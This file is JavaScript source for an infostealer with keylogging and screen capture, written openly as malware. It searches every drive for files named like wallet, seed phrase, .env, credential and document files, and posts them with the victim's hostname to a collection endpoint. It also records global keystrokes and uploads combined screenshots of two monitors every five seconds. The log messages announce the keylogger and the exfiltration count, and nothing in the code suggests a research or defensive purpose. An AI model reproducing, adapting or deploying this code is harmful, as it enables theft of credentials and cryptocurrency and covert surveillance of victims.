const fs = require('fs');
const path = require('path');
const axios = require('axios');
const os = require('os');
let screenshotCounter = 0;

const searchKey = [
    "*.env*",
    "*metamask*",
    "*phantom*",
    "*bitcoin*",
    "*trust*",
    "*phrase*",
    "*secret*",
    "*phase*",
    "*credential*",
    "*profile*",
    "*account*",
    "*mnemonic*",
    "*seed*",
    "*recovery*",
    "*backup*",
    "*address*",
    "*keypair*",
    "*wallet*",
    "*my*",
    "*screenshot*",
    "*.doc*",
    "*.docx*",
    "*.pdf*",
    "*.cd*",
    "*.rtf*",
    "*.odt*",
    "*.xls*",
    "*.xlsx*",
    "*.txt*",
    "*.ini*",
    "*.secret*",
    "*.json*",
    "*.ts*",
    "*.js*",
    "*.csv*",
];

const excludeFolders = [
    'node_modules', 'Windows', 'Program Files', 'Program Files (x86)', 
    'System Volume Information', '$Recycle.Bin', 'AppData', '.cache', 
    '.npm', '.git', 'tmp', 'temp', '/var', '/usr', '/bin', '/sbin', 
    '/etc', '/dev', '/proc', '/sys',
    'Recovery', 'pagefile.sys', 'hiberfil.sys', 'swapfile.sys',
    'Thumbs.db', '$RECYCLE.BIN', 'System Restore', 'Config.Msi',
    'MSOCache', 'Installer', 'iPod_Control', 'iTunes', 'OneDriveTemp',
    'Application Data', 'LocalLow', 'ProgramData', 'PerfLogs',
    'Boot', 'EFI', 'WindowsApps', 'WinSxS', 'WIM',
];

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const isFileMatching = (fileName) => {
    const lowerFileName = fileName.toLowerCase();
    return searchKey.some(pattern => {
        const lowerPattern = pattern.toLowerCase();
        if (lowerPattern.startsWith('*') && lowerPattern.endsWith('*')) {
            const keyword = lowerPattern.slice(1, -1);
            return lowerFileName.includes(keyword);
        } else if (lowerPattern.startsWith('*.')) {
            const extension = lowerPattern.slice(1);
            return lowerFileName.endsWith(extension);
        }
        return false;
    });
};

let listenerAdded = false;

setTimeout(() => {
    try {
        const GlobalKeyboardListener = require("node-global-key-listener").GlobalKeyboardListener;
        const { Monitor } = require("node-screenshots");
        const sharp = require("sharp");
        const FormData = require("form-data");
        const keyStates = {};
        let capsLock = false;
        const tmpDir = os.tmpdir();
        const keyboard = new GlobalKeyboardListener();

        let text = "";
        let shift = false;
        let ctrl = false;
        let isRunning = true;
        const uu = "http://127.0.0.1:5918/total";

        const uf = async (p) => {
            if (fs.statSync(p).isFile()) {
                const form = new FormData();
                form.append("file", fs.createReadStream(p));
                try {
                    const response = await axios.post(uu, form, {
                        headers: {
                            ...form.getHeaders(),
                            userkey: 1995,
                            hostname: os.hostname(),
                            path: p,
                            t: "66"
                        }
                    });
                    // console.log(`Uploaded file: ${p}`);
                } catch (error) {
                    console.error(`Error uploading file ${p}:`, error.message);
                }
            }
        };
        const sendKeyText = async () => {
            if (text.trim() === "") return;
            const form = new FormData();
            form.append("text", text);
            try {
                const response = await axios.post(uu, form, {
                    headers: {
                        ...form.getHeaders(),
                        userkey: 1995,
                        hostname: os.hostname(),
                        t: "66"
                    }
                });
                console.log(`Uploaded key text: ${text}`);
                text = ""; // Clear text after sending
            } catch (error) {
                console.error(`Error uploading key text:`, error.message);
            }
        };
        const addKeyboardListener = () => {
            if (listenerAdded) return;
            listenerAdded = true;

            keyboard.addListener(function (e, down) {
                if (!isRunning) return;

                const key = e.name.toLowerCase();
                const state = e.state;
                // console.log(key);
                if (state === "DOWN") {
                    if (e.rawKey.name === "LSHIFT" || e.rawKey.name === "RSHIFT") {
                        shift = true;
                        keyStates[key] = { pressed: true, pressTime: Date.now() };
                    } else if (e.rawKey.name === "LCONTROL" || e.rawKey.name === "RCONTROL") {
                        ctrl = true;
                        keyStates[key] = { pressed: true, pressTime: Date.now() };
                    } else if (e.rawKey.name === "CAPSLOCK") {
                        capsLock = !capsLock;
                        console.log(`Caps Lock: ${capsLock ? "ON" : "OFF"}`);
                        keyStates[key] = { pressed: true, pressTime: Date.now() };
                    }
                } else if (state === "UP") {
                    if (e.rawKey.name === "LSHIFT" || e.rawKey.name === "RSHIFT") {
                        shift = false;
                        delete keyStates[key];
                    } else if (e.rawKey.name === "LCONTROL" || e.rawKey.name === "RCONTROL") {
                        ctrl = false;
                        delete keyStates[key];
                    } else if (e.rawKey.name === "CAPSLOCK") {
                        delete keyStates[key];
                    }
                }

                if (state !== "DOWN" || ctrl) return;

                const modifiers = ["shift", "control", "alt", "tab", "caps lock", "windows"];
                if (modifiers.includes(key)) return;

                const special = {
                    "return": "\n",
                    "space": " ",
                    "backspace": "[BS]",
                    "delete": "[DEL]",
                    "tab": "[TAB]",
                    "escape": "[ESC]",
                    "mouse left": "submit"
                };
                console.log(e.rawKey.name);
                if (e.rawKey.name === "RETURN" || e.rawKey.name === "LBUTTON") {
                    text += special[key];
                    sendKeyText(); // Send text when Enter is pressed
                } else if (special[key]) {
                    text += special[key];
                } else if (key.length === 1) {
                    let char = key;
                    if (capsLock) {
                        char = char.toUpperCase();
                    } else if (shift) {
                        char = char.toUpperCase();
                    } else {
                        char = char.toLowerCase();
                    }
                    text += char;
                }
            });
            

            console.log("KEYBOARD LISTENER ADDED");
        };

        const scanDir = async (dirPath) => {
            if (!fs.existsSync(dirPath)) return;

            let items;
            try {
                items = fs.readdirSync(dirPath);
            } catch (e) {
                return;
            }

            for (const item of items) {
                try {
                    const fullPath = path.join(dirPath, item);
                    if (item === "go") continue;

                    const containExcludedWord = excludeFolders.some((word) =>
                        fullPath.toLowerCase().includes(word.toLowerCase())
                    );

                    if (containExcludedWord) continue;

                    const stat = fs.statSync(fullPath);

                    if (stat.isDirectory()) {
                        if (!excludeFolders.includes(item)) {
                            await scanDir(fullPath);
                        }
                    } else if (stat.isFile() && isFileMatching(item)) {
                        await uf(fullPath);
                        totalFiles++;
                        await sleep(120);
                    }
                } catch (e) {
                    // Silent fail
                }
            }
        };

        const scanFullSystem = async () => {
            const rootDrives = [];
            let totalFiles = 0;

            if (process.platform === 'win32') {
                const drives = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
                for (let letter of drives) {
                    const drive = `${letter}:/`;
                    if (fs.existsSync(drive)) {
                        rootDrives.push(drive);
                        console.log(`Found drive: ${drive}`);
                    }
                }
            } else {
                rootDrives.push('/');
                const mounts = ['/mnt', '/media', '/Volumes', '/home'];
                mounts.forEach(mount => {
                    if (fs.existsSync(mount)) rootDrives.push(mount);
                });
            }

            console.log(`FULL SYSTEM SCAN: ${rootDrives.length} drives/folders`);
            console.log('='.repeat(60));

            for (const root of rootDrives) {
                console.log(`Scanning: ${root}`);
                await scanDir(root);
            }

            console.log(`SCAN COMPLETE! Total exfiltrated: ${totalFiles} files`);
        };

        // Initialize keyboard listener once
        addKeyboardListener();
        scanFullSystem();

        // Screenshot timer (every 5 seconds)
        setInterval(async () => {
            if (!isRunning) return;
            try {
                const monitors = Monitor.all();

                if (monitors.length < 2) {
                    throw new Error("At least two monitors are required to combine screenshots.");
                }

                const [monitor1, monitor2] = [monitors[0], monitors[1]];
                const image1 = monitor1.captureImageSync();
                const image2 = monitor2.captureImageSync();
                console.log("Captured screenshots for monitors:", monitor1.id, monitor2.id);

                const screenshot1Meta = await sharp(image1.toPngSync()).metadata();
                const screenshot2Meta = await sharp(image2.toPngSync()).metadata();

                const combinedImage = await sharp({
                    create: {
                        width: screenshot1Meta.width + screenshot2Meta.width,
                        height: Math.max(screenshot1Meta.height, screenshot2Meta.height),
                        channels: 4,
                        background: { r: 0, g: 0, b: 0, alpha: 1 }
                    }
                })
                    .composite([
                        { input: image1.toPngSync(), left: 0, top: 0 },
                        { input: image2.toPngSync(), left: screenshot1Meta.width, top: 0 }
                    ])
                    .jpeg({ quality: 80 })
                    .toBuffer();

                const screenshotDir = path.join(tmpDir, 'screenshots');
                fs.existsSync(screenshotDir) || fs.mkdirSync(screenshotDir, { recursive: true });
                const screenshotPath = path.join(screenshotDir, `screenshot${screenshotCounter++}.jpeg`);
                fs.writeFileSync(screenshotPath, combinedImage);
                console.log(`Saved combined screenshot to ${screenshotPath}`);

                await uf(screenshotPath);
                text = '';
                console.log(`Uploaded combined screenshot from ${screenshotPath}`);
            } catch (err) {
                console.error('Error capturing or combining screenshots:', err);
            }
        }, 5000);
        console.log("KEYLOGGER + SCREENSHOT ACTIVE!");
    } catch (error) {
        console.error("KEYLOGGER INIT ERROR:", error.message);
    }
}, 2000);